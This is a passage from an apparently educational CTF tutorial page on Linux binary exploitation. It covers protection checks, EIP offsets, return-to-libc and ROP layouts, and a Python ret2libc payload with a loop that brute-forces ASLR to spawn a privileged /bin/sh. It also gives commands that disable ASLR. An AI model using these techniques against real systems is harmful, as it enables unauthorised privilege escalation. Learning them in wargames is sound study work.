

<!doctype html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-92365403-1']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();
    </script>
    <title>CTF Series : Binary Exploitation &#8212; tech.bitvijays.com</title>
    <link rel="stylesheet" href="_static/bizstyle.css" type="text/css" />
    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
    <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
    <script type="text/javascript" src="_static/jquery.js"></script>
    <script type="text/javascript" src="_static/underscore.js"></script>
    <script type="text/javascript" src="_static/doctools.js"></script>
    <script type="text/javascript" src="_static/disqus.js"></script>
    <script type="text/javascript" src="_static/bizstyle.js"></script>
    <link rel="search" title="Search" href="search.html" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!--[if lt IE 9]>
    <script type="text/javascript" src="_static/css3-mediaqueries.js"></script>
    <![endif]-->
  </head><body>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
  <h3><a href="index.html">Table Of Contents</a></h3>
  <ul>
<li><a class="reference internal" href="#">CTF Series :  Binary Exploitation</a><ul>
<li><a class="reference internal" href="#basics">Basics</a><ul>
<li><a class="reference internal" href="#initial-checks">Initial Checks?</a><ul>
<li><a class="reference internal" href="#binary-architecture">Binary Architecture</a></li>
<li><a class="reference internal" href="#binary-help">Binary Help?</a></li>
<li><a class="reference internal" href="#binary-protection">Binary Protection</a></li>
<li><a class="reference internal" href="#eip-offsets">EIP Offsets?</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#buffer-overflow">Buffer overflow</a><ul>
<li><a class="reference internal" href="#executable-stack">Executable Stack</a></li>
<li><a class="reference internal" href="#non-executable-stack-aslr-disabled">Non-executable stack, ASLR Disabled</a><ul>
<li><a class="reference internal" href="#export-a-environment-variable">Export a environment variable</a></li>
<li><a class="reference internal" href="#return2libc">Return2libc</a></li>
<li><a class="reference internal" href="#return-oriented-programming">Return-Oriented Programming</a></li>
</ul>
</li>
<li><a class="reference internal" href="#non-executable-stack-aslr-enabled">Non-Executable Stack, ASLR Enabled</a><ul>
<li><a class="reference internal" href="#find-the-offset-of-system-exit-and-bin-sh">Find the offset of system, exit and /bin/sh</a></li>
<li><a class="reference internal" href="#creation-of-exploit">Creation of exploit</a></li>
<li><a class="reference internal" href="#calling-the-targetted-binary-multiple-times">Calling the targetted binary multiple times</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#format-string-vulnerability">Format String Vulnerability</a><ul>
<li><a class="reference internal" href="#definition">Definition</a></li>
<li><a class="reference internal" href="#behaviour-of-the-format-function">Behaviour of the format function</a></li>
<li><a class="reference internal" href="#crashing-the-program">Crashing the Program</a></li>
<li><a class="reference internal" href="#viewing-the-stack">Viewing the stack</a></li>
<li><a class="reference internal" href="#viewing-memory-at-any-location">Viewing Memory at any location</a></li>
<li><a class="reference internal" href="#overwriting-of-arbitrary-memory">Overwriting of Arbitrary Memory</a><ul>
<li><a class="reference internal" href="#direct-parameter-access">Direct Parameter Access</a></li>
<li><a class="reference internal" href="#write-two-bytes">Write two bytes</a></li>
<li><a class="reference internal" href="#write-four-bytes">Write four bytes</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#shared-library">Shared Library</a><ul>
<li><a class="reference internal" href="#hijack-the-global-offset-table-with-pointers">Hijack the Global Offset Table with pointers</a></li>
</ul>
</li>
<li><a class="reference internal" href="#tips-and-tricks">Tips and Tricks</a></li>
<li><a class="reference internal" href="#appendix-i-gdb-basics">Appendix-I GDB Basics</a><ul>
<li><a class="reference internal" href="#getting-inputs">Getting inputs</a><ul>
<li><a class="reference internal" href="#getting-inputs-from-char-argv">Getting inputs from char *argv[]</a></li>
<li><a class="reference internal" href="#getting-inputs-from-a-file">Getting inputs from a file</a></li>
<li><a class="reference internal" href="#getting-inputs-from-stdin">Getting inputs from stdin</a></li>
<li><a class="reference internal" href="#getting-inputs-from-network">Getting inputs from network</a></li>
<li><a class="reference internal" href="#keep-the-stdin-open-after-injection">Keep the stdin open after injection</a></li>
</ul>
</li>
<li><a class="reference internal" href="#examining-data">Examining Data</a><ul>
<li><a class="reference internal" href="#examining-functions">Examining functions</a></li>
<li><a class="reference internal" href="#examining-memory">Examining Memory</a></li>
<li><a class="reference internal" href="#id1">Examining Data</a></li>
<li><a class="reference internal" href="#examining-frames">Examining Frames</a></li>
<li><a class="reference internal" href="#examining-registers">Examining Registers</a></li>
<li><a class="reference internal" href="#setting-program-variable">Setting program variable</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#radare2-basics">Radare2 Basics</a></li>
<li><a class="reference internal" href="#appendix-ii-ld-preload">Appendix-II LD_PRELOAD</a><ul>
<li><a class="reference internal" href="#hijacking-functions">Hijacking Functions</a><ul>
<li><a class="reference internal" href="#important-things-to-note">Important things to note</a></li>
</ul>
</li>
<li><a class="reference internal" href="#controlling-uninitialized-memory-with-ld-preload">Controlling uninitialized memory with LD_PRELOAD</a></li>
<li><a class="reference internal" href="#libc-rpath">LIBC - Rpath</a><ul>
<li><a class="reference internal" href="#rpath">RPATH</a></li>
<li><a class="reference internal" href="#libc-start-main">libc_start_main</a></li>
<li><a class="reference internal" href="#gmon-start">gmon_start</a></li>
<li><a class="reference internal" href="#version-reference">Version Reference</a></li>
<li><a class="reference internal" href="#ld-debug-environment-variable">LD_DEBUG environment variable</a></li>
</ul>
</li>
<li><a class="reference internal" href="#ulimit">ulimit</a></li>
</ul>
</li>
<li><a class="reference internal" href="#appendix-iii-basic-concepts">Appendix-III Basic Concepts</a><ul>
<li><a class="reference internal" href="#registers">Registers</a></li>
<li><a class="reference internal" href="#stack">Stack</a><ul>
<li><a class="reference internal" href="#uses">Uses</a></li>
<li><a class="reference internal" href="#example">Example</a></li>
</ul>
</li>
<li><a class="reference internal" href="#calling-conventions">Calling Conventions</a><ul>
<li><a class="reference internal" href="#cdecl">cdecl</a></li>
<li><a class="reference internal" href="#sysv">SysV</a></li>
</ul>
</li>
<li><a class="reference internal" href="#global-offset-table">Global Offset Table</a><ul>
<li><a class="reference internal" href="#plt">PLT</a></li>
</ul>
</li>
<li><a class="reference internal" href="#buffer">Buffer</a></li>
</ul>
</li>
<li><a class="reference internal" href="#buffer-overflow-examples">Buffer Overflow Examples</a></li>
<li><a class="reference internal" href="#format-string-examples">Format String Examples</a></li>
<li><a class="reference internal" href="#miscellanous-examples">Miscellanous Examples</a></li>
<li><a class="reference internal" href="#changelog">Changelog</a></li>
</ul>
</li>
</ul>

  <h3>This Page</h3>
  <ul class="this-page-menu">
    <li><a href="_sources/LFC-BinaryExploitation.rst.txt"
           rel="nofollow">Show Source</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/blob/master/docs/LFC-BinaryExploitation.rst"
           rel="nofollow">Show on GitHub</a></li>
    <li><a href="https://github.com/bitvijays/bitvijays.github.io-sphinx/edit/master/docs/LFC-BinaryExploitation.rst"
           rel="nofollow">Edit on GitHub</a></li>
  </ul>
<div id="searchbox" style="display: none" role="search">
  <h3>Quick search</h3>
    <div class="searchformwrapper">
    <form class="search" action="search.html" method="get">
      <input type="text" name="q" />
      <input type="submit" value="Go" />
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
    </div>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="ctf-series-binary-exploitation">
<h1>CTF Series :  Binary Exploitation<a class="headerlink" href="#ctf-series-binary-exploitation" title="Permalink to this headline">¶</a></h1>
<p>This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF’s and Over The Wire Wargame.</p>
<p><strong>Thanks to superkojiman, barrebas, et0x who helped me learning the concepts.</strong></p>
<div class="section" id="basics">
<h2>Basics<a class="headerlink" href="#basics" title="Permalink to this headline">¶</a></h2>
<p>Let’s start with some basic concepts and then we would see some examples which would help to clear the concepts.</p>
<ul class="simple">
<li>Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address. {% img left /images/big-endian.png 250 250 %} {% img right /images/little-endian.png 250 250 %}</li>
</ul>
<div class="section" id="initial-checks">
<h3>Initial Checks?<a class="headerlink" href="#initial-checks" title="Permalink to this headline">¶</a></h3>
<p>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.</p>
<div class="section" id="binary-architecture">
<h4>Binary Architecture<a class="headerlink" href="#binary-architecture" title="Permalink to this headline">¶</a></h4>
<p>Executable binary is running on whether x86 or x86-64.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>uname -a
</pre></div>
</div>
<p>Whether the binary is compiled for 32 bit or 64 bit.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>file binary_file
</pre></div>
</div>
</div>
<div class="section" id="binary-help">
<h4>Binary Help?<a class="headerlink" href="#binary-help" title="Permalink to this headline">¶</a></h4>
<p>Probably a good idea to just run the binary with -h or –help flag to check if any help documentation is provided.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$ ./flagXX -h
Usage: php [options] [-f] &lt;file&gt; [--] [args...]
      php [options] -r &lt;code&gt; [--] [args...]
</pre></div>
</div>
</div>
<div class="section" id="binary-protection">
<h4>Binary Protection<a class="headerlink" href="#binary-protection" title="Permalink to this headline">¶</a></h4>
<p>Multiple Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE).</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Address space Layout Randomization     : Kernel
Executable Stack Protection            : Compiler
Stack smashing protection              : Compiler
Position Independent Executables       : Compiler
Fortify Source                         : Compiler
Stack Protector                        : Compiler
</pre></div>
</div>
<ul class="simple">
<li>Which buffer overflow prevention techniques are used can be found by running Checksec Script. This script is present in gdb-peda.</li>
<li>Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU_STACK has RWE flag, if it has E flag, it’s executable.</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:~$ readelf -l /narnia/narnia8 | grep GNU_STACK
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
</pre></div>
</div>
<p>In order to make the stack executable, the program needs to be compiled with -z execstack option and to disable stack smashing option -fno-stack-protector should be used.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gcc -ggdb -m32 -fno-stack-protector -z execstack -o buffer1 buffer1.c
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Address Space Layout Randomization (ASLR) controlled by /proc/sys/kernel/randomize_va_space.</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Three Values:
0  : Disable ASLR. This setting is applied if the kernel is booted with the norandmaps boot parameter.
1  : Randomize the positions of the stack, virtual dynamic shared object (VDSO) page, and shared memory regions. The base address of the data segment is located immediately after the end of the executable code segment.
2  : Randomize the positions of the stack, VDSO page, shared memory regions, and the data segment. This is the default setting.
</pre></div>
</div>
<p>You can change the setting temporarily by writing a new value to /proc/sys/kernel/randomize_va_space, for example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>echo value &gt; /proc/sys/kernel/randomize_va_space
</pre></div>
</div>
<p>To change the value permanently, add the setting to /etc/sysctl.conf, for example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>kernel.randomize_va_space = value
and run the sysctl -p command.
</pre></div>
</div>
<p>If you change the value of randomize_va_space, you should test your application stack to ensure that it is compatible with the new setting. If necessary, you can disable ASLR for a specific program and its child processes by using the following command:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>% setarch `uname -m` -R program [args ...]
</pre></div>
</div>
</div></blockquote>
<p><strong>PIE Enabled</strong></p>
<p>If a binary is PIE enabled, we won’t be able to get the addresses until we run it. So, one of the way is to disable ASLR on linux, that way addresses are always the same during analysis.</p>
<ul class="simple">
<li>Use the start command in gdb to load the binary and break at _start</li>
<li>then use vmmap (if using pwndbg) to see memory layout. If you want the starting address of binary</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x555555554000     0x555555556000 r-xp     2000 0      /root/work/lucky/lucky
0x555555756000     0x555555757000 r-xp     1000 2000   /root/work/lucky/lucky
0x555555757000     0x555555758000 rwxp     1000 3000   /root/work/lucky/lucky
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>So starting address is 0x555555554000; from here we can set breakpoints by adding the offset in IDA.</li>
<li>You can see the offsets in IDA if you go to Options &gt; General and check Line Prefixes</li>
<li>Now you can set a breakpoint. Eg if strcpy() is offset 0x123, then you can do</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>br *0x555555554000+0x123
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="eip-offsets">
<h4>EIP Offsets?<a class="headerlink" href="#eip-offsets" title="Permalink to this headline">¶</a></h4>
<p>To know the EIP offset, you can use cyclic patterns. Use pattern_create.rb to create a random pattern which can be used to find the offset and pattern_offset.rb to find the exact offset.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37654136
[*] Exact match at offset 140
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="buffer-overflow">
<h2>Buffer overflow<a class="headerlink" href="#buffer-overflow" title="Permalink to this headline">¶</a></h2>
<div class="section" id="executable-stack">
<h3>Executable Stack<a class="headerlink" href="#executable-stack" title="Permalink to this headline">¶</a></h3>
<p>Either you can put the shellcode on the buffer and then redirect the EIP to NOP Sled followed by the shellcode (provided the shellcode used is correct and the stack is executable).</p>
</div>
<div class="section" id="non-executable-stack-aslr-disabled">
<h3>Non-executable stack, ASLR Disabled<a class="headerlink" href="#non-executable-stack-aslr-disabled" title="Permalink to this headline">¶</a></h3>
<p>However, if the stack is not executable or the shellcode is not working (happens sometimes), then we can either,</p>
<div class="section" id="export-a-environment-variable">
<h4>Export a environment variable<a class="headerlink" href="#export-a-environment-variable" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Export a environment variable with shellcode.</li>
<li>Find the address of env variable in the stack. Utilize getenvaddr.c to get the address of the environment variable</li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="o">---</span><span class="n">getenvaddr</span><span class="p">.</span><span class="n">c</span><span class="o">---</span>

<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
       <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>

       <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
              <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
       <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
               <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="cm">/* Get environment variable location */</span>
               <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span> <span class="cm">/* Adjust for program name */</span>
               <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ptr</span><span class="p">);</span>
       <span class="p">}</span>
 <span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Set the return address to starting of the shellcode</li>
<li>Get a shell</li>
</ul>
</div>
<div class="section" id="return2libc">
<h4>Return2libc<a class="headerlink" href="#return2libc" title="Permalink to this headline">¶</a></h4>
<p>Use return2libc which is a type of ROP</p>
<ul>
<li><p class="first">Find the address of system function (Run “gdb -q ./program”; break main; p system)</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb -q ./retlib
(no debugging symbols found)...(gdb)
(gdb) b main
Breakpoint 1 at 0x804859e
(gdb) r
Starting program: /home/c0ntex/retlib
(no debugging symbols found)...(no debugging symbols found)...
Breakpoint 1, 0x0804859e in main ()
(gdb) p system
$1 = {&lt;text variable, no debug info&gt;} 0x28085260 &lt;system&gt;
</pre></div>
</div>
</li>
<li><p class="first">Find the address of “/bin/sh” in the stack or export it in the environment variable and execute it like system(“/bin/sh”). It is in the format of</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span> &lt;ADDRofSYSTEM&gt; &lt;4ArbitraryBytes for Return Address&gt; &lt;argument for system[/bin/sh]&gt;

4Arbitrary Bytes for Return address could be a JUNK address or &quot;\xCC\xCC\xCC\xCC&quot; or address of exit function.
</pre></div>
</div>
<p>The above pattern is because, when a function is called a stack frame is formed and the parameters for it are pushed onto the stack, followed by the return address(EIP) of your previous function along with your Stack Pointers(ebp, esp). with you Stack Pointer being on top of the frame.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Top of stack              lower memory address

Buffer
....
Saved Frame Pointer (EBP)
Saved Return address (EIP)
Function() arguments
Function() arguements

Bottom of stack          higher memory address
</pre></div>
</div>
</div></blockquote>
<p>If Return Address set to</p>
<ul class="simple">
<li>\xCC\xCC\xCC\xCC so after system executes, it tries to return to 0xcccccccc. \xcc is good just to check if you’re actually jumping to your shellcode, but once you’ve verified that it works, then you should remove it. ret expects an address. not a payload, xCCxCCxCCxCC should be present as a payload.</li>
<li>If a JUNK address is put, the binary will have already executed the shellcode but it will segfault.</li>
<li>If the proper address of exit() is used, binary will exit cleanly.</li>
</ul>
<p>It’s better to use /bin/sh instead of /bin/bash since bash drops privs. If /bin/bash is used, it will launch /bin/bash but you’ll find that you haven’t elevated your privileges and this can get confusing. so either find another string that points to /bin/sh or set your own env variable like DASH=/bin/sh and reference that. Good paper to review is <a class="reference external" href="https://css.csail.mit.edu/6.858/2017/readings/return-to-libc.pdf">Bypassing non-executable-stack during Exploitation (return-to-libc)</a> and <a class="reference external" href="http://shellblade.net/docs/ret2libc.pdf">Performing a ret2libc Attack</a></p>
<ul class="simple">
<li>Sometimes you need to put a cat to keep the shell alive</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(cat input; cat) | ./binary input is the payload you are sending.
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="return-oriented-programming">
<h4>Return-Oriented Programming<a class="headerlink" href="#return-oriented-programming" title="Permalink to this headline">¶</a></h4>
<p>Msfelfscan can be used to locate interesting addresses within executable and linkable format (ELF) programs, which may prove useful in developing exploits.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>/usr/share/framework2/msfelfscan -f stack7
 Usage: /usr/share/framework2/msfelfscan &lt;input&gt; &lt;mode&gt; &lt;options&gt;
Inputs:
        -f  &lt;file&gt;    Read in ELF file
Modes:
        -j  &lt;reg&gt;     Search for jump equivalent instructions
        -s            Search for pop+pop+ret combinations
        -x  &lt;regex&gt;   Search for regex match
        -a  &lt;address&gt; Show code at specified virtual address
Options:
        -A  &lt;count&gt;   Number of bytes to show after match
        -B  &lt;count&gt;   Number of bytes to show before match
        -I  address   Specify an alternate base load address
        -n            Print disassembly of matched data
</pre></div>
</div>
<p>We can use msfelfscan to get pop-pop-retun, choose that address and use</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pop-pop-ret-addr | 8 bytes junk | address to execute |

where address-to-execute is the address of the environment variable where shellcode is stored.
</pre></div>
</div>
</div>
</div>
<div class="section" id="non-executable-stack-aslr-enabled">
<h3>Non-Executable Stack, ASLR Enabled<a class="headerlink" href="#non-executable-stack-aslr-enabled" title="Permalink to this headline">¶</a></h3>
<p>If the aslr is enabled, the address for the libc would change everytime, the binary is executed.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>for i in `seq 1 5`; do ldd ovrflw | grep libc; done
       libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb762f000)
       libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb758f000)
       libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75ae000)
</pre></div>
</div>
<p>However, if we notice the libc address in not changing much, first three characters and last three characters remain the same. Because, the machine we are doing would be probably a CTF machine, so we can brute-force the possible libc address. It is suggested to figure out the offset of system, exit and string “/bin/sh” from the libc base address. Remember,</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&lt;ADDRofSYSTEM&gt; &lt;4ArbitraryBytes for Return Address&gt; &lt;argument for system[/bin/sh]&gt;
</pre></div>
</div>
<div class="section" id="find-the-offset-of-system-exit-and-bin-sh">
<h4>Find the offset of system, exit and /bin/sh<a class="headerlink" href="#find-the-offset-of-system-exit-and-bin-sh" title="Permalink to this headline">¶</a></h4>
<p>System</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
  246: 00113d70    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
  628: 0003ab40    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
 1461: 0003ab40    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
</pre></div>
</div>
<p>Exit function</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
  112: 0002ec00    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
  141: 0002e7f0    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  451: 0002ec30   181 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
  559: 000b1645    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
  617: 00116de0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
  652: 00120b60    33 FUNC    GLOBAL DEFAULT   13 quick_exit@GLIBC_2.10
  654: 0002ebd0    33 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.24
  878: 0002ea20    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
 1048: 00120b20    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
 1398: 001b3204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
 1510: 000f4130    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
 2112: 001b3150     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
 2267: 0002e820    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
 2410: 000f54f0     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
</pre></div>
</div>
<p>String /bin/sh</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
15cdc8 /bin/sh
</pre></div>
</div>
<p>Now, we know the offset of the system, exit and /bin/sh</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span> 1461: 0003ab40    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
  141: 0002e7f0    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
15cdc8 /bin/sh
</pre></div>
</div>
</div>
<div class="section" id="creation-of-exploit">
<h4>Creation of exploit<a class="headerlink" href="#creation-of-exploit" title="Permalink to this headline">¶</a></h4>
<p>Now, when we have the offset, let’s take a sample libc address and create the exploit</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>from subprocess import call
import struct

#---Offsets of System, Exit and /bin/sh
libc_base_addr = 0xb75e6000
system_offset  = 0x0003ab40
exit_offset    = 0x0002e7f0
binsh_offset   = 0x0015cdc8

#---Calculation of System, Exit, binsh addr
system_addr = struct.pack(&quot;&lt;I&quot;,libc_base_addr + system_offset)
exit_addr   = struct.pack(&quot;&lt;I&quot;,libc_base_addr + exit_offset)
binsh_addr  = struct.pack(&quot;&lt;I&quot;,libc_base_addr + binsh_offset)

#---Creating the payload
buf = &quot;A&quot; * 112
buf += system_addr
buf += exit_addr
buf += binsh_addr
</pre></div>
</div>
</div>
<div class="section" id="calling-the-targetted-binary-multiple-times">
<h4>Calling the targetted binary multiple times<a class="headerlink" href="#calling-the-targetted-binary-multiple-times" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#---Execution of the binary multiple times
i = 0;
while(i&lt;512):
  print &quot;Try :%s&quot; %i
  i = i+1
  ret = call([&quot;/usr/local/bin/ovrflw&quot;,buf])
</pre></div>
</div>
<ul class="simple">
<li>Sometimes we need a shellcode to write a string or for getting a actual shell. A good reference can be found <a class="reference external" href="https://www.exploit-db.com/raw/13224/">Introduction to Writing Shellcode</a> Information about various system call integar value need to be present in EAX register is <a class="reference external" href="https://syscalls.kernelgrok.com/">Linux System Call Table</a></li>
</ul>
<blockquote>
<div><p>Let’s see a small example where we move an address to eax register and jump to it. Address which we are moving to eax would contain our shellcode.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>;test.asm
[SECTION .text]
global _start
_start:
        mov eax, 0xffffd8bc
      jmp eax
</pre></div>
</div>
<p>Just good to know: global directive is NASM specific. It is for exporting symbols in your code to where it points in the object code generated. Here you mark _start symbol global so its name is added in the object code (a.o). The linker (ld) can read that symbol in the object code and its value so it knows where to mark as an entry point in the output executable. When you run the executable it starts at where marked as _start in the code.</p>
<p>If a global directive missing for a symbol that symbol will not be placed in the object code’s export table so linker has no way of knowing about the symbol. We can compile the asm file by</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>nasm -f elf test.asm
</pre></div>
</div>
<p>link it</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ld -o test test.o
</pre></div>
</div>
<p>If you get the below error</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ld: i386 architecture of input file `test.o&#39; is incompatible with i386:x86-64 output
</pre></div>
</div>
<p>either</p>
<p>Use 64 bits instead of 32 for your loader and compile it with the following command:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>nasm -f elf64 loader.asm -o loader.o
</pre></div>
</div>
<p>or</p>
<p>If want compile the file as 32 bits composition, you can use:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>ld -m elf_i386 -s -o file.o file
</pre></div>
</div>
<p>To see the byte code</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>objdump -d &lt;file&gt;
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>What we mostly do when exploiting a buffer overflow (when placing the shellcode on stack) is we place our shellcode before EIP, we should also check if we can put our shellcode after EIP. This is particularly useful when some kind of check for shellcode is present in address before EIP. Example: Suppose our EIP is present at offset 80. We would usually do</li>
</ul>
<blockquote>
